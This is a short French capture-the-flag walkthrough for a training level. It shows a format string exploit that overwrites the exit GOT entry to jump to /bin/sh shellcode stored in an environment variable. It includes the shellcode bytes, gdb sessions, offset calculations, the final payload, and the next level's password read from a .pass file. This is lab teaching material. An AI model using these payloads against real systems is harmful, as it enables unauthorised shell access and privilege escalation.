# Level04

```shell
$ ./level05
Hello World
hello world
```

Il utile notre `input` comme premier parametre de son printf. On peut alors une faille `FormatString` pour changer l'appel de la fonction `exit` pour notre variable d'environnement `Shellcode`

```shell
$ export Shellcode=$(python -c 'print "\x90"*100 +"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80"')

$ gdb level05 -q
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.

(gdb) b *main
Breakpoint 1 at 0x8048444

(gdb) run
Starting program: /home/users/level05/level05

Breakpoint 1, 0x08048444 in main ()

(gdb) x/s *((char **)environ)
0xffffd860: "Shellcode=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Phn/shh//bi\211\343P\211\341P\211\342\260\v̀"
```

Nous avons l'adresse de notre variable `Shellcode => 0xffffd860`

On cherche l'adresse de la fonction `exit`

```shell
$ gdb level05 -q
Reading symbols from /home/users/level05/level05...(no debugging symbols found)...done.

(gdb) disas exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:     jmp    *0x80497e0
   0x08048376 <+6>:     push   $0x18
   0x0804837b <+11>:    jmp    0x8048330
End of assembler dump.
```

Nous avons l'adresse de la fonction exit `exit => 0x80497e0`

On a plus qu'a enregistrer `0xd860` puis `0xffff`

- `0xd860 + 0x30 = 55440 - 8 = 55432`
- `0xffff = 65535 - 55440 = 10095`

On cherche a connaitre le nombre `NB` pour tomber sur notre input dans `"aaaa%NB$x"`

```shell
$ python -c 'print("aaaa%10$x")' | ./level05
aaaa61616161
```

On a plus qu'a tout rassembler

```shell
$ (python -c 'print("\x08\x04\x97\xe0"[::-1] + "\x08\x04\x97\xe2"[::-1] + "%55432d%10$hn" + "%10095d%11$hn")'; cat) | ./level05
...
               -134415680
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
